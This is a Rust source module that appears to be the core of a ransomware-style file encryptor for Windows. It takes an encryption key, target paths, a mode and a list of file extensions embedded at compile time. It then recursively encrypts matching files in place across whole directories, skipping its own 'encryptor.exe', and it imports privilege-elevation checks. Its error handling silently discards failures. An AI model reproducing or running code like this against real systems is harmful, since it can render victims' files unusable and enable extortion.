use std::io::Write;
use std::path::Path;
use colored::Colorize;
use rypes::errors::errors::RError;
use walkdir::{WalkDir};
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Security::{GetTokenInformation, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
use crate::decrypt::decrypt_file_in_place;
use crate::encrypt::encrypt_file_in_place;

pub fn get_embedded_config() -> Result<(String, Vec<String>, String, Vec<String>,), RError> {
	let key : &'static str                      = env!("ENCRYPTION_KEY")        ;
	let paths_str : &'static str                = env!("TARGET_PATHS")          ;
	let mode : &'static str                     = env!("OPERATION_MODE")        ;
	let allowed_extensions_str : &'static str   = env!("ALLOWED_EXTENSIONS")    ;

	let paths: Vec<String> = paths_str.to_string().split('|').map(|s : &str| s.to_string()).collect();
	let allowed_extensions: Vec<String> = allowed_extensions_str.to_string().split('|').map(|s : &str| s.to_string()).collect();

	Ok((key.to_string(), paths, mode.to_string(), allowed_extensions))
}

pub fn process_path(path_str: &str, key: &[u8; 32], mode: &str, allowed_extensions: Vec<String>) -> Result<(), RError> {
	let path = Path::new(path_str);

	if !path.exists() { RError::new(format!("Path does not exist: {}", path_str).to_string()); }

	if path.is_file() {
		if mode == "encrypt" && !should_encrypt_file(path, allowed_extensions.clone()) {
			return Ok(());
		}

		let result = if mode == "encrypt" { encrypt_file_in_place(path, key) } else { decrypt_file_in_place(path, key) };

		match result {
			Ok(_) => {}
			Err(e) => { RError::new(format!("err in process path {} {}", path_str, e).to_string()); }
		}
	} else if path.is_dir() {
		println!("   Scanning directory...");
		for entry in WalkDir::new(path).follow_links(false).into_iter().filter_map(|e| e.ok()) {
			let entry_path = entry.path();
			if !entry_path.is_file() { continue; }

			if let Some(name) = entry_path.file_name() {
				if name == "encryptor.exe" { continue; }
			}

			if mode == "encrypt" { if !should_encrypt_file(entry_path, allowed_extensions.clone()) { continue; } }

			let result = if mode == "encrypt" { encrypt_file_in_place(entry_path, key) } else { decrypt_file_in_place(entry_path, key) };

			match result {
				Ok(_) => {
					match std::io::stdout().flush() {
						Ok(_) => {}
						Err(e) => { RError::new(format!("err in process path {} {}", path_str, e).to_string()); }
					};
				}
				Err(e) => { RError::new(format!("err in process path {} {}", path_str, e).to_string()); }
			}
		}
	}

	Ok(())
}

fn should_encrypt_file(path: &Path, allowed_extension: Vec<String>) -> bool {
	let extension = path.extension().and_then(|ext| ext.to_str()).map(|ext| ext.to_lowercase());

	match extension {
		Some(ext) => { allowed_extension.contains(&ext.to_string()) }
		_ => { false }
	}
}
